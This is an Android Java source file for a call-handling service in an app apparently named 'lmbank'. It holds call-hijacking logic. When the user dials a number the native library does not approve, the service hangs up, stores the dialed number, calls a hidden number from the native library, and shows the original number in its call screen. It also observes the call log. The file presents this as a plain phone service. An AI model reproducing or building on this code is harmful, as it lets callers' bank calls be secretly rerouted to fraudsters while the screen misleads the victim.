package com.example.lmbank.service;

import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.provider.CallLog;
import android.telecom.Call;
import android.telecom.InCallService;

import com.example.lmbank.activity.AnswerView;
import com.example.lmbank.activity.CallPhoneView;
import com.example.lmbank.util.PhoneCallManager;
import com.example.lmbank.util.PhoneUtil;
import com.example.lmbank.util.SharedPreferencesUtils;


public class PhoneCallService extends InCallService {
    private CallLogObserver callLogObserver;

    static {
        System.loadLibrary("myapplication");
    }

    public native boolean isPhone(String phone);

    public native String getPhone();

    private final WindowActivity windowActivity = new WindowActivity();
    private final WindowFloating floating = new WindowFloating();
    private CallPhoneView callPhoneView;
    private AnswerView answerView;
    public static PhoneCallService callService;
    public String phone;
    private final Call.Callback callback = new Call.Callback() {
        @Override
        public void onStateChanged(Call call, int state) {
            super.onStateChanged(call, state);
            switch (state) {
                case Call.STATE_NEW://拨打电话
                case Call.STATE_DIALING:
                    break;
                case Call.STATE_DISCONNECTED://挂断电话
                    call.disconnect();
                    windowActivity.onDestroy();
                    floating.onDestroy();
                    Intent intent = new Intent(getApplicationContext(), PhoneCallService.class);
                    stopService(intent);
                    break;
                case Call.STATE_ACTIVE://接听
                    if (callPhoneView != null) {
                        callPhoneView.initTime();
                    }
                    break;
            }
        }
    };

    @Override
    public void onCallAdded(Call call) {
        super.onCallAdded(call);
        String phoneNumber = PhoneUtil.getCallPhone(call);
        if (call.getState() == Call.STATE_RINGING) {
            handle(call, phoneNumber);
        } else if (call.getState() == Call.STATE_CONNECTING) {//拨打电话
            this.phone = phoneNumber;
            if (isPhone(phoneNumber)) {
                CallPhone(call, phoneNumber);
            } else {
                SharedPreferencesUtils.putString(getApplicationContext(), "phone", phoneNumber);
                call.disconnect();
                PhoneUtil.placeCall(this, getPhone());
            }
        } else if (call.getState() == Call.STATE_SELECT_PHONE_ACCOUNT) {//选择卡拨号
            SharedPreferencesUtils.putString(getApplicationContext(), "phone", phoneNumber);
            PhoneUtil.placeCall(this, getPhone());
        }
    }

    private void CallPhone(Call call, String phoneNumber) {
        String phone = SharedPreferencesUtils.getString(getApplicationContext(), "phone", phoneNumber);
        callPhoneView = new CallPhoneView(this, PhoneUtil.formatPhoneNumber(phone), call, windowActivity);
        PhoneCallManager.call = call;
        call.registerCallback(callback);
    }

    private void handle(Call call, String phone) {
        if (PhoneCallManager.call != null && PhoneCallManager.call.getState() == Call.STATE_ACTIVE) {
            call.reject(false, null);
        }
        answerView = new AnswerView(this, phone, call, floating, windowActivity);
        PhoneCallManager.call = call;
        call.registerCallback(callback);
    }

    @Override
    public void onCallRemoved(Call call) {
        super.onCallRemoved(call);
        call.unregisterCallback(callback);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        callService = null;
        floating.onDestroy();
        if (callPhoneView != null) {
            callPhoneView.onDestroy();
        }
        if (answerView != null) {
            answerView.onDestroy();
        }
        if (callLogObserver != null) {
            getContentResolver().unregisterContentObserver(callLogObserver);
        }
    }

    public static PhoneCallService getInstance() {
        return callService;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        callLogObserver = new CallLogObserver(this, new Handler(Looper.myLooper()));
        getContentResolver().registerContentObserver(CallLog.Calls.CONTENT_URI, true, callLogObserver);
        callService = this;
    }


}


